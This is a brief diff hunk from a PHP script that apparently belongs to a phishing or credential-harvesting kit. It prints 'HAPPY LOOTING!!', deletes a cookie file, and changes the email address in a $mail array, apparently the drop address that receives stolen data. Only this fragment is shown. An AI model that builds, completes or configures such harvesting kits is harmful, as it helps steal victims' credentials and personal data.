@@ -4,7 +4,7 @@ echo " HAPPY LOOTING!! \n";
 unlink('cookie.txt');
 
 
-$mail = array("allvishy6@gasss.net");
+$mail = array("spech3030@twitch.work");
 
 
 $gg = rand(1,100);
